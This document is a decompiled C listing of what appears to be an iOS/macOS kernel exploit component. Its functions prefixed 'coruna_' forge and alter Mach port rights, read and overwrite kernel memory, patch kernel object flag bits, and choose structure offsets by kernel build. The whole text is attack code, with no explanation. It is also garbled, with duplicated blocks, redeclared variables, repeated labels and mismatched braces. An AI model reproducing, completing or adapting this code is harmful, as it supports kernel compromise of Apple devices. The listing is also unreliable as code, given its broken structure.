    port = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2 + 8,&action);
    if ((int)port == 0) {
      return (uint8_t *)0x2800f;
    }
    if ((((uint)action & version) != 0) &&
       (port = coruna_mach_vm_machine_attribute(handle,addr_2 + 8,(uint)action & (version ^ 0xffffffff)),
       (int)port == 0)) {
      return (uint8_t *)0x28010;
    }
    if (0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) {
      serial_buf = 0;
      thread_attr = 0;
      scratch = 0;
      action = 0;
      buf = (uint8_t *)coruna_proc_pidinfo_2b960(port,8);
      ptr = k_kernel_mach_task_self_slot;
      if ((int)buf != 0) {
        return buf;
      }
      handle = coruna_mach_ports_register(handle,*(uint32_t *)k_kernel_mach_task_self_slot,&bootargs,
                            (long)&serial_buf + 4);
      if (handle == 0) {
        return (uint8_t *)0x28026;
      }
      version = serial_buf * (uint)bootargs;
      size = _vm_allocate(*(vm_map_t *)ptr,&action,(unsigned long)version,1);
      if (size == 0) {
        err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle,serial_buf * (uint)bootargs,action);
        if (err == 0) {
          lm12 = 0;
        }
        else {
          if ((uint)bootargs != 0) {
            size = 0;
            do {
              host_info = 0;
              handle = action + serial_buf * size;
              ___memcpy_chk(&host_info,handle,(long)*(int *)(handle + 0x168),8);
              if (((host_info != 0) && (host_info = coruna_kernel600c_via_ctx_test_flag_9(handle), host_info == addr_2)) &&
                 (u = *(uint *)(handle + *(int *)(handle + 0x168)), (u >> 0x10 & 1) != 0))
              {
                str = (uint8_t *)0x0;
                lm12 = (mach_port_name_t)(coruna_u64_pack((size), (u)) >> 0x18);
                if ((action != 0) && (version != 0)) {
                _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
                }
                if ((int)str != 0) {
                return str;
                }
                if (lm12 + 1 < 2) {
                version = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
                if (version == 0) {
                handle = coruna_ret_stub_2(handle,(mach_port_name_t)serial_buf);
                if (handle == 0) {
                return (uint8_t *)0x2800e;
                }
                addr = coruna_return_zero_2af7c(handle,handle);
                if (addr == 0) {
                return (uint8_t *)0x2802c;
                }
                err = *(int *)(handle + 0x168);
                status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2,&scratch);
                if (status == 0) {
                return (uint8_t *)0x2800f;
                }
                if ((((scratch >> 10 & 1) != 0) &&
                (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) ||
                (err = coruna_kernel600c_residual_229(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) +
                err * 2),addr_2), err == 0)) {
                return (uint8_t *)0x28010;
                }
                version = _mach_port_request_notification
                (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                (mach_port_t *)((long)&thread_attr + 4));
                if (version == 0) {
                if (thread_attr + 1 < 2) {
                return (uint8_t *)0x28008;
                }
                str = (uint8_t *)coruna_proc_pidinfo_2b960(0,8);
                if ((int)str != 0) {
                return str;
                }
                handle = coruna_call_return_zero_290d4(handle,thread_attr);
                if (handle == 0) {
                return (uint8_t *)0x2800e;
                }
                err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return (uint8_t *)0x2800f;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x40000) {
                return (uint8_t *)0x28011;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return (uint8_t *)0x28010;
                }
                version = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
                if (version == 0) {
                size = 0;
                task = *(ipc_space_t *)ptr;
                poly = thread_attr;
                do {
                action = action & 0xffffffff00000000;
                version = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
                if (version != 0) break;
                version = _mach_port_mod_refs(task,(uint)action,1,-1);
                if (version != 0) break;
                version = _mach_port_insert_right(task,(uint)action,poly,0x13);
                if (version == 0) {
                lm12 = (uint)action;
                if ((scratch >> 10 & 1) != 0) {
                coruna_mach_vm_machine_attribute(handle,addr_2);
                }
                handle = coruna_call_return_zero_290d4(handle,thread_attr);
                if (handle == 0) {
                return (uint8_t *)0x2800e;
                }
                err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return (uint8_t *)0x2800f;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x10000) {
                return (uint8_t *)0x28011;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return (uint8_t *)0x28010;
                }
                version = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
                if (version == 0) {
                *arg = lm12;
                return (uint8_t *)0x0;
                }
                break;
                }
                err = size < 8;
                size = size + 1;
                } while ((version & 0xfffffff7) == 5 && err);
                }
                }
                }
                }
                else {
                version = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
                if (version == 0) {
                *arg = lm12;
                return (uint8_t *)0x0;
                }
                }
                return (uint8_t *)(unsigned long)(version | 0x80000000);
              }
              size = size + 1;
            } while (size < (uint)bootargs);
          }
          lm12 = 0;
          str = (uint8_t *)0x0;
        }
      }
      else {
        lm12 = 0;
        str = (uint8_t *)(unsigned long)(size | 0x80000000);
      }
fail:
      if ((action != 0) && (version != 0)) {
        _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
      }
      if ((int)str != 0) {
        return str;
      }
      if (lm12 + 1 < 2) {
        version = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
        if (version == 0) {
          handle = coruna_ret_stub_2(handle,(mach_port_name_t)serial_buf);
          if (handle == 0) {
            return (uint8_t *)0x2800e;
          }
          addr = coruna_return_zero_2af7c(handle,handle);
          if (addr == 0) {
            return (uint8_t *)0x2802c;
          }
          err = *(int *)(handle + 0x168);
          status = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2,&scratch);
          if (status == 0) {
            return (uint8_t *)0x2800f;
          }
          if ((((scratch >> 10 & 1) != 0) &&
              (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) ||
             (err = coruna_kernel600c_residual_229(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) +
                                                                 err * 2),addr_2), err == 0)) {
            return (uint8_t *)0x28010;
          }
          version = _mach_port_request_notification
                            (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                             (mach_port_t *)((long)&thread_attr + 4));
          if (version == 0) {
            if (thread_attr + 1 < 2) {
              return (uint8_t *)0x28008;
            }
            str = (uint8_t *)coruna_proc_pidinfo_2b960(0,8);
            if ((int)str != 0) {
              return str;
            }
            handle = coruna_call_return_zero_290d4(handle,thread_attr);
            if (handle == 0) {
              return (uint8_t *)0x2800e;
            }
            err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle + 8,&thread_attr);
            if (err == 0) {
              return (uint8_t *)0x2800f;
            }
            if (((uint)thread_attr & 0x1f0000) != 0x40000) {
              return (uint8_t *)0x28011;
            }
            thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
            err = coruna_mach_vm_machine_attribute(handle,handle + 8);
            if (err == 0) {
              return (uint8_t *)0x28010;
            }
            version = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
            if (version == 0) {
              size = 0;
              task = *(ipc_space_t *)ptr;
              poly = thread_attr;
              do {
                action = action & 0xffffffff00000000;
                version = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
                if (version != 0) break;
                version = _mach_port_mod_refs(task,(uint)action,1,-1);
                if (version != 0) break;
                version = _mach_port_insert_right(task,(uint)action,poly,0x13);
                if (version == 0) {
                  lm12 = (uint)action;
                  if ((scratch >> 10 & 1) != 0) {
                    coruna_mach_vm_machine_attribute(handle,addr_2);
                  }
                  handle = coruna_call_return_zero_290d4(handle,thread_attr);
                  if (handle == 0) {
                    return (uint8_t *)0x2800e;
                  }
                  err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle + 8,&thread_attr);
                  if (err == 0) {
                    return (uint8_t *)0x2800f;
                  }
                  if (((uint)thread_attr & 0x1f0000) != 0x10000) {
                    return (uint8_t *)0x28011;
                  }
                  thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
                  err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                  if (err == 0) {
                    return (uint8_t *)0x28010;
                  }
                  version = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
                  if (version == 0) {
                    *arg = lm12;
                    return (uint8_t *)0x0;
                  }
                  break;
                }
                err = size < 8;
                size = size + 1;
              } while ((version & 0xfffffff7) == 5 && err);
            }
          }
        }
      }
      else {
        version = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
        if (version == 0) {
          *arg = lm12;
          return (uint8_t *)0x0;
        }
      }
      return (uint8_t *)(unsigned long)(version | 0x80000000);
    }
  }
  serial_buf = 0;
  err = *(int *)(handle + 0x140);
  handle = 0x38;
  if (err < 0x1f53) {
    if ((err != 0x1809) && (err != 0x1c1b)) {
      return (uint8_t *)0x2802c;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return (uint8_t *)0x2802c;
    }
    handle = 0x30;
  }
  _arc4random_buf(&host_info,8);
  bootargs = 0;
  thread_attr = 0;
  thread_attr = 0;
  err = coruna_host_create_mach_voucher();
  if (err == 0) {
done:
    err = false;
    str = &k_kernel_slot_1001;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return str;
  }
  addr = coruna_kernel600c_via_return_zero_28118(handle,serial_buf);
  if (addr == 0) {
    err = false;
    str = (uint8_t *)0x28025;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return str;
  }
  addr = addr + handle;
  err = coruna_kernel600c_residual_228(handle,addr,&action);
  err = false;
  if (1 < serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
  }
  if (err) {
  *arg = (mach_port_name_t)serial_buf;
  }
  else if (1 < (mach_port_name_t)serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
  }
  return str;
}





long coruna_mach_port_destroy(long handle,uint size)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  long scratch;
  long bootargs;
  uint64_t thread_attr;
  void *host_info;
  long serial_buf;
  
  thread_attr = 0;
  host_info = (void *)0x0;
  scratch = 0;
  bootargs = 0;
  if (*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) {
    u = *(uint *)(handle + 0x180);
    if (*(uint *)(handle + 0x180) <= size) {
      u = size;
    }
    serial_buf = 0;
    ptr = _calloc((unsigned long)u,1);
    if (ptr == (void *)0x0) {
      return 0;
    }
    err = coruna_iomfb_slot_read(u << 1,&serial_buf);
    if ((((err == 0) && (err = coruna_return_zero_16450(serial_buf,0x1000000,4,0), err == 0)) &&
        (err = coruna_return_zero_16450(serial_buf,0x8000000,4,"key"), err == 0)) &&
       (err = coruna_return_zero_16450(serial_buf,0x8a000000,(unsigned long)u,ptr), err == 0)) {
      err = coruna_memcpy_1655c(serial_buf,&host_info,(long)&thread_attr + 4);
    }
    if (serial_buf != 0) {
      coruna_free_165e4();
    }
    _free(ptr);
    if (err == 0) {
      size = coruna_ioservice_publish_1bdc0(host_info,thread_attr,&thread_attr);
      u = (mach_port_name_t)size + 1;
      if (((((1 < u) && (bootargs = coruna_kernel600c_via_return_zero_28118(handle,size), bootargs != 0)) &&
           ((err = coruna_kernel600c_residual_228(handle,bootargs + 0x10,&bootargs), err != 0 &&
            ((err = coruna_kernel600c_residual_228(handle,bootargs + 0x18,&bootargs), err != 0 &&
             (err = coruna_kernel600c_residual_228(handle,bootargs + 0x20,&bootargs), err != 0)))))) &&
          (err = coruna_kernel600c_residual_228(handle,bootargs + *(int *)(handle + 0x168),&bootargs), err != 0)
          ) && (((err = coruna_kernel600c_residual_228(handle,bootargs + 0x18,&scratch), err != 0 &&
                 (scratch = coruna_ptr_canonicalize(handle,scratch), scratch != 0)) &&
                (err = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,bootargs + 0x18,0), err == 0)))) {
        scratch = 0;
      }
      if (host_info != (void *)0x0) {
        _free(host_info);
      }
      if (1 < u) {
        _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)size);
      }
      if ((mach_port_name_t)thread_attr + 1 < 2) {
        return scratch;
      }
      _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)thread_attr);
      return scratch;
    }
  }
  return 0;
}





uint8_t * coruna_mach_port_allocate(long handle,long addr_2,unsigned long arg)
{
  pthread_mutex_t *ptr;
  mach_port_name_t lm2;
  uint64_t *ptr;
  uint u;
  uint8_t *buf;
  uint size;
  ipc_space_t task;
  int err;
  uint version;
  long handle;
  mach_port_name_t lm10;
  uint8_t *str;
  unsigned long port;
  uint64_t *copy;
  uint64_t *data;
  void *ptr;
  uint8_t *obj;
  uint64_t tag;
  uint64_t kind;
  mach_port_name_t scratch;
  vm_address_t bootargs [3];
  
  buf = k_kernel_mach_task_self_slot;
  version = (uint)arg;
  if (*(unsigned long *)(handle + 0x158) < 0x1f541e00000000) {
    scratch = 0;
    size = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
    lm10 = scratch;
    if (size != 0) {
      return (uint8_t *)(unsigned long)(size | 0x80000000);
    }
    str = (uint8_t *)coruna_buf_init(bootargs);
    if ((int)str == 0) {
      str = (uint8_t *)coruna_kernel600c_via_buf_grow(bootargs,0xffffffff);
      if ((int)str == 0) {
        str = (uint8_t *)coruna_mach_msg(bootargs,0,lm10,0);
        coruna_free_1b8e0(bootargs);
        if ((int)str == 0) {
          bootargs[0] = coruna_u64_pack71((bootargs[0]), (2));
          size = *(uint *)(handle + 0x168);
          u = 0;
          if (size != 0) {
            u = version / size;
          }
          if (((version == u * size) && (handle = coruna_kernel600c_via_kernel600c_via_kernel600c_via_return_zero_2af7c_2aa9c(handle,scratch), handle != 0)) &&
             (ptr = _calloc(arg & 0xffffffff,1), ptr != (void *)0x0)) {
            err = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,addr_2,ptr,arg);
            _free(ptr);
            if ((err != 0) && (err = coruna_kernel600c_residual_229(handle,handle + 0x24,addr_2), err != 0)) {
              size = 0;
              if (*(uint *)(handle + 0x168) != 0) {
                size = version / *(uint *)(handle + 0x168);
              }
              err = coruna_mach_vm_machine_attribute(handle,handle + 0x30,size);
              if (err != 0) {
                err = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + 0x2f,bootargs,1);
                version = 0x1001;
                if (err != 0) {
                  version = 0;
                }
                str = (uint8_t *)(unsigned long)version;
                task = *(ipc_space_t *)buf;
                lm10 = scratch;
                _mach_port_mod_refs(task,lm10,1,-1);
                return str;
              }
            }
          }
          str = &k_kernel_slot_1001;
        }
      }
      else {
        coruna_free_1b8e0(bootargs);
      }
    }
fail:
    task = *(ipc_space_t *)buf;
    lm10 = scratch;
    _mach_port_mod_refs(task,lm10,1,-1);
    return str;
  }
  bootargs[0] = 0;
  if ((arg & 0xf) != 0) {
    return (uint8_t *)0xad001;
  }
  size = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,bootargs,arg & 0xffffffff,1);
  if (size == 0) {
    ptr = (pthread_mutex_t *)(handle + 0x330);
    size = _pthread_mutex_lock(ptr);
    if (size == 0) {
      if (*(void **)(handle + 0x370) != (void *)0x0) {
        copy = (uint64_t *)0x0;
        data = *(void **)(handle + 0x370);
        do {
          if ((data[1] == addr_2) && (*(uint *)(data + 3) == version)) {
            ptr = (uint64_t *)(handle + 0x370);
            if (copy != (uint64_t *)0x0) {
              ptr = copy;
            }
            *ptr = *data;
            size = _pthread_mutex_unlock(ptr);
            version = -size;
            if (-1 < (int)size) {
            version = size;
            }
            str = (uint8_t *)(unsigned long)(version | 0x40000000);
            lm10 = 0;
            }
            else {
            str = (uint8_t *)(unsigned long)(size | 0x80000000);
            lm10 = 0;
            }
            check_ok:
            if (bootargs[0] != 0) {
            _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
            }
            if (lm10 + 1 < 2) {
            return str;
          }
          ptr = (void *)*data;
          copy = data;
          data = ptr;
        } while (ptr != (void *)0x0);
      }
      size = _pthread_mutex_unlock(ptr);
      if (size == 0) {
        str = (uint8_t *)0xad011;
        lm10 = 0;
        if (bootargs[0] != 0) {
        _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
        }
        if (lm10 + 1 < 2) {
        return str;
        }
        task = *(ipc_space_t *)buf;
        _mach_port_mod_refs(task,lm10,1,-1);
        return str;
      }
    }
cleanup:
    version = -size;
    if (-1 < (int)size) {
      version = size;
    }
    str = (uint8_t *)(unsigned long)(version | 0x40000000);
    lm10 = 0;
  }
  else {
    str = (uint8_t *)(unsigned long)(size | 0x80000000);
    lm10 = 0;
  }
check_ok:
  if (bootargs[0] != 0) {
    _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
  }
  if (lm10 + 1 < 2) {
    return str;
  }
  task = *(ipc_space_t *)buf;
done:
  _mach_port_mod_refs(task,lm10,1,-1);
  return str;
}





long coruna_mach_port_request_notification_2c77c(long handle,uint *size)
{
  pthread_mutex_t *ptr;
  int err;
  uint u;
  uint size;
  uint8_t *ptr;
  uint64_t *buf;
  uint version;
  kern_return_t lk8;
  int status;
  ipc_space_t task;
  void *ptr;
  long handle;
  long addr;
  uint64_t port;
  uint64_t *str;
  mach_port_name_t name;
  int flags;
  unsigned long tag;
  uint64_t *copy;
  long off;
  size_t ls19;
  uint kind;
  unsigned long type_id;
  uint32_t scratch;
  uint bootargs;
  uint64_t thread_attr;
  mach_port_t host_info;
  uint64_t serial_buf;
  long action [3];
  
  ptr = k_kernel_mach_task_self_slot;
  kind = *size;
  tag = *(unsigned long *)(handle + 0x158);
  if (0x1f541dffffffff < tag) {
    serial_buf = 0;
    host_info = 0;
    thread_attr = 0;
    if ((tag < 0x22580a06c00000) &&
       ((tag < 0x1f543c40800000 || (0x2257 < *(int *)(handle + 0x140))))) {
      tag = 0;
      type_id = (unsigned long)*(uint *)(handle + 0x168);
    }
    else {
      type_id = 0;
      tag = (unsigned long)*(uint *)(handle + 0x168);
    }
    lk8 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                (mach_port_name_t *)((long)&serial_buf + 4));
    if (lk8 == 0) {
      handle = coruna_call_helper_2914c(handle,serial_buf);
      if ((((handle != 0) && (handle = coruna_return_zero_2af7c(handle,handle), handle != 0)) &&
          (handle = handle + (long)*(int *)(handle + 0x168) * 3, handle != 0)) &&
         (lk8 = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf),
         lk8 == 0)) {
        while( true ) {
          lk8 = _mach_port_request_notification
                            (*(ipc_space_t *)ptr,serial_buf,0x48,0,(mach_port_name_t)serial_buf
                             ,0x15,&host_info);
          if (lk8 != 0) break;
          lk8 = _mach_port_request_notification
                            (*(ipc_space_t *)ptr,serial_buf,0x48,0,0,0x15,&host_info);
          if (lk8 != 0) break;
          if (1 < host_info + 1) {
            lk8 = _mach_port_deallocate(*(ipc_space_t *)ptr,host_info);
            if (lk8 != 0) break;
            host_info = 0;
          }
          status = coruna_kernel600c_via_mach_vm_read_overwrite_2(handle,handle,action);
          if (status == 0) break;
          off = coruna_kernel600c_via_ctx_test_flag_3(handle,action[0]);
          if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
            off = coruna_kernel600c_via_ctx_test_flag_6(handle,off,&bootargs);
          }
          addr = coruna_ptr_canonicalize(handle,off);
          if (addr == 0) break;
          version = bootargs;
          if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
            status = coruna_kernel600c_via_mach_vm_read_overwrite_2(handle,off + type_id,&thread_attr);
            if (status == 0) break;
            port = coruna_kernel600c_via_ctx_test_flag_3(handle,thread_attr);
            addr = coruna_kernel600c_residual_218(handle,port);
            if ((addr == 0) || (status = coruna_call_mach_vm_machine_attribute_29df8_1d654(handle,port,4,&bootargs), status == 0))
            break;
          }
          if (kind <= version) {
            status = coruna_kernel600c_residual_227(handle,handle,0);
            if ((status != 0) && (str = _malloc(0x28), str != (uint64_t *)0x0)) {
              *str = 0;
              str[1] = off;
              str[2] = action[0];
              *(uint *)(str + 3) = version;
              *(mach_port_name_t *)((long)str + 0x1c) = serial_buf;
              str[4] = thread_attr;
              serial_buf = serial_buf & 0xffffffff;
              ptr = (pthread_mutex_t *)(handle + 0x330);
              status = _pthread_mutex_lock(ptr);
              _free(str);
              off = 0;
              version = kind;
              if (1 < serial_buf + 1) {
              _mach_port_mod_refs(*(ipc_space_t *)ptr,serial_buf,1,-1);
              }
              kind = version;
              if ((off != 0) && (kind != *size)) {
              *size = kind;
              }
              return off;
            }
            break;
          }
          scratch = 0;
          status = coruna_call_mach_vm_machine_attribute_29df8_21874(handle,off + tag,&scratch,4);
          if (status == 0) break;
        }
      }
    }
check_ok:
    off = 0;
    version = kind;
    if (1 < serial_buf + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,serial_buf,1,-1);
    }
    kind = version;
    if ((off != 0) && (kind != *size)) {
    *size = kind;
    }
    return off;
  }
  version = coruna_iosurface_buf_size(handle);
  ptr = k_kernel_mach_task_self_slot;
  if (version == 0) {
    return 0;
  }
  if (version <= kind) {
    version = *(uint *)(handle + 0x180);
    u = 0;
    if (version != 0) {
      u = kind / version;
    }
    err = kind - u * version;
    status = 0;
    if (err != 0) {
      status = version - err;
    }
    kind = status + kind;
  }
  version = *(uint *)(handle + 0x168);
  if (kind < version * 0x3fff) {
    thread_attr = (unsigned long)thread_attr << 0x20;
    u = 0;
    if (version != 0) {
      u = kind / version;
    }
    err = kind - u * version;
    status = 0;
    if (err != 0) {
      status = version - err;
    }
    lk8 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                (mach_port_name_t *)&thread_attr);
    if (lk8 != 0) {
      off = 0;
      if (kind != *size) {
        *size = kind;
      }
      return off;
    }
    version = status + kind;
    ptr = _calloc((unsigned long)version,1);
    if (ptr == (void *)0x0) {
      off = 0;
      return off;
    }
    u = *(uint *)(handle + 0x168);
    size = 0;
    if (u != 0) {
      size = version / u;
    }
    if (version == size * u) {
      tag = thread_attr & 0xffffffff;
      status = coruna_buf_init(action);
      if (status != 0) {
        _free(ptr);
        off = 0;
        return off;
      }
      u = 0;
      if (*(uint *)(handle + 0x168) != 0) {
        u = version / *(uint *)(handle + 0x168);
      }
      status = coruna_kernel600c_via_buf_grow_2(action,ptr,u);
      if (status == 0) {
        status = coruna_mach_msg(action,0,tag,0);
        coruna_free_1b8e0(action);
        if (status != 0) {
          _free(ptr);
          off = 0;
          return off;
        }
        handle = coruna_kernel600c_via_kernel600c_via_kernel600c_via_return_zero_2af7c_2e1d4(handle,thread_attr & 0xffffffff);
        off = 0;
        if (handle != 0) {
          status = coruna_kernel600c_residual_226(handle,handle + 0x24,action);
          if ((status == 0) || (off = coruna_ptr_canonicalize(handle,action[0]), off == 0)) {
            _free(ptr);
            off = 0;
            return off;
          }
          status = coruna_mach_vm_machine_attribute(handle,handle + 0x20,0);
          off = 0;
          if (status != 0) {
            off = action[0];
          }
        }
        if ((off != 0) && (kind != *size)) {
          *size = kind;
        }
        return off;
      }
      coruna_free_1b8e0(action);
    }
    _free(ptr);
    off = 0;
    return off;
  }
  thread_attr = (unsigned long)thread_attr << 0x20;
  lk8 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                              (mach_port_name_t *)&thread_attr);
  if (lk8 != 0) {
    off = 0;
    return off;
  }
  off = 0;
  return off;
}





long coruna_vm_deallocate_2ced4(uint64_t val,uint *size)
{
  uint8_t *ptr;
  uint u;
  kern_return_t lk3;
  int err;
  long handle;
  unsigned long size;
  vm_address_t scratch;
  uint bootargs;
  
  bootargs = *size;
  handle = coruna_mach_port_request_notification_2c77c(val,&bootargs);
  u = bootargs;
  ptr = k_kernel_mach_task_self_slot;
  if (handle != 0) {
    scratch = 0;
    size = (unsigned long)bootargs;
    lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,1);
    if (lk3 == 0) {
      err = coruna_call_mach_vm_machine_attribute_29df8_1e994(val,handle,scratch,size);
      if (err != 0) {
        if (u != *size) {
          *size = u;
        }
        _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
        return handle;
      }
      _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
    }
    coruna_mach_port_allocate(val,handle,size);
  }
  return 0;
}





unsigned long coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_3(uint *arg,uint64_t val,uint64_t n,int m,
                  uint16_t p)

{
  uint type_id_21;
  int n;
  unsigned long u;
  long serial_12;
  long serial_13;
  uint cache_28;
  uint cache_94;
  uint cache_77;
  uint cache_31;
  uint cache_90;
  uint cache_82;
  long scratch;
  uint64_t cache_53;
  uint16_t cache_101;
  
  scratch = 0;
  cache_53 = 0;
  if ((*arg & 0x5584201) == 0) {
    return 0xad008;
  }
  cache_101 = p;
  u = coruna_slab_table_walk(arg,&cache_82,&cache_90,&cache_31,&cache_77);
  if ((int)u != 0) {
    return u;
  }
  u = coruna_kernel29478_via_mach_port_deallocate_2a684(arg,n,&cache_53);
  if ((int)u != 0) {
    return u;
  }
  serial_12 = coruna_kernel600c_via_return_zero_28118(arg,val);
  if (serial_12 == 0) {
    return 0x2800e;
  }
  n = coruna_kernel600c_residual_228(arg,serial_12 + (unsigned long)cache_82,&scratch);
  if (n == 0) {
    return 0x2800f;
  }
  if ((scratch != 0) && (serial_13 = coruna_ptr_canonicalize(arg), serial_13 == 0)) {
    return 0x28026;
  }
  n = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(arg,serial_12 + (unsigned long)cache_82,cache_53);
  if (n == 0) {
    return 0x28010;
  }
  if (m != 0) {
    n = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,serial_12 + (unsigned long)cache_90,&cache_94);
    if (n == 0) {
      return 0x2800f;
    }
    if (3 < cache_94) {
      return 0x28011;
    }
    n = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,serial_12 + (unsigned long)cache_31,&cache_28);
    if (n == 0) {
      return 0x2800f;
    }
    if (12000000 < cache_28) {
      return 0x28011;
    }
    n = coruna_mach_vm_machine_attribute(arg,serial_12 + (unsigned long)cache_90,1);
    if (n == 0) {
      return 0x28010;
    }
    n = coruna_mach_vm_machine_attribute(arg,serial_12 + (unsigned long)cache_31,12000000);
    if (n == 0) {
      return 0x28010;
    }
  }
  n = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_12 + (unsigned long)cache_77,2,&cache_94);
  if (n == 0) {
    return 0x2800f;
  }
  if (0x7f < (ushort)cache_94) {
    return 0x28011;
  }
  n = coruna_call_mach_vm_machine_attribute_29df8_1e994(arg,serial_12 + (unsigned long)cache_77,&cache_101,2);
  type_id_21 = 0;
  if (n == 0) {
    type_id_21 = 0x28010;
  }
  return (unsigned long)type_id_21;
}





uint64_t coruna_slab_table_walk(uint *size,uint *flags_2,int *flags,int *count_2,int *fd_3)
{
  bool err;
  bool status;
  int err;
  int status;
  uint u;
  uint size;
  int flags;
  uint version;
  int count;
  unsigned long port;
  int idx;
  
  size = 0x5584001;
  port = *(unsigned long *)(size + 0x56);
  version = *size;
  if (0x44a < port >> 0x2b) {
    size = 0x5584201;
  }
  if ((version & size) == 0) {
    return 0xad008;
  }
  size = size[0x50];
  if ((int)size < 0x2258) {
    if (size - 0x1f53 < 2) {
      if ((version >> 0x14 & 1) == 0) {
        flags = 0x16c;
        if (port < 0x1f530f02800000) {
          flags = 0x170;
        }
        size = 0x210;
        if (port < 0x1f530f02800000) {
          size = 0x280;
        }
        count = 0x1b4;
        if (port < 0x1f530f02800000) {
          count = 0x224;
        }
        status = 0x174;
        if (port < 0x1f530f02800000) {
          status = 0x178;
        }
        u = 0x218;
        if (port < 0x1f530f02800000) {
          u = 0x288;
        }
        idx = 0x1bc;
        if (port < 0x1f530f02800000) {
          idx = 0x22c;
        }
        status = (version & 0x84000) != 0;
        if (status) {
          count = idx;
          flags = status;
          size = u;
        }
        status = 0x184;
        if (status) {
          status = 0x18c;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return 0;
      }
      err = 0x1f530f027ffffe < port;
      status = port == 0x1f530f027fffff;
      flags = 0x17c;
      if (port < 0x1f530f02800000) {
        flags = 0x180;
      }
      size = 0x220;
